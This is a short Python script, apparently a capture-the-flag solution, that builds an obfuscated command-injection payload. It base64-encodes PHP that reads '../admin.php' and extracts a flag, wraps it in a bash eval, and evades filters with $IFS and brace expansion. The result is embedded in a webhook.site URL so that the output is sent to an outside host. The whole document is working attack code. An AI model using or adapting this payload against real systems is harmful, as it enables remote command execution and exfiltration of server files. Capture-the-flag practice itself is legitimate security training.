from base64 import b64encode
webhook = 'https://webhook.site/CENSORED'
php_payload = '''$txt = file_get_contents("../admin.php");
preg_match("(CACI{.*})", $txt, $matches);
print $matches[0];'''
bash_payload = f"php -r 'eval(base64_decode(\"{b64encode(php_payload.encode()).decode()}\"));'"
payload = f'{webhook}/$(bash$IFS-c$IFS"{{eval,\\`{{echo,{b64encode(bash_payload.encode()).decode()}}}|{{base64,-d,-w,0}}\\`}}")'
print(payload)
